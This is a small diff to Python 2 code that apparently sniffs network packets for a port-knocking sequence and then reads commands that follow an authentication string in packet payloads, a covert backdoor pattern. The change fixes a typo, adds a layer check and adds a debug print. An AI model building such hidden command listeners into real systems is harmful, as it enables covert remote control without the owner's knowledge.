@@ -55,7 +55,8 @@ def knock(packet):
                 print "You suck, state = 0"
 
 def runCommand(packet):
-    if pakcet.haslayer(Raw):
+    if packet.haslayer(IP) and packet.haslayer(Raw):
+        print packet.show
         data = packet['Raw'].load
         if data.startswith(authString):
             data = data[len(authString):]
